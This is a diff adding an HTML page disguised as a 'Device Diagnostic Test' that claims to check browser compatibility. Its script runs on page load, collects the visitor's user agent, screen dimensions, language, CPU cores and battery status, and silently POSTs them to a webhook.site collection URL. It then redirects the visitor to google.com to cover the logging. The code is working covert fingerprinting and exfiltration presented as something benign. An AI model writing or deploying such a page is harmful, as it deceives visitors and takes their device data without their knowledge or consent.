@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Device Diagnostic Test</title>
+</head>
+<body>
+    <h2>Analyzing Device Metrics...</h2>
+    <p>Please wait while the system checks browser compatibility.</p>
+
+    <script>
+        async function collectAndSendData() {
+            // 1. Gather basic browser and screen metrics
+            let deviceData = {
+                userAgent: navigator.userAgent,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                language: navigator.language,
+                cores: navigator.hardwareConcurrency || "Unknown",
+                timestamp: new Date().toISOString()
+            };
+
+            // 2. Attempt to gather Battery Status if supported by the browser
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    deviceData.batteryLevel = (battery.level * 100) + "%";
+                    deviceData.isCharging = battery.charging;
+                } catch (e) {
+                    deviceData.batteryLevel = "Error reading battery";
+                }
+            } else {
+                deviceData.batteryLevel = "Unsupported/Blocked by Browser";
+            }
+
+            // 3. Send the data to your webhook endpoint
+            fetch("https://webhook.site/8632b681-4501-4d45-b918-cbb48a657586", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(deviceData)
+            }).then(() => {
+                // Optional: Redirect the user to a clean page after logging
+                window.location.href = "https://google.com";
+            }).catch(err => console.error(err));
+        }
+
+        // Run the function when the page loads
+        window.onload = collectAndSendData;
+    </script>
+</body>
+</html>
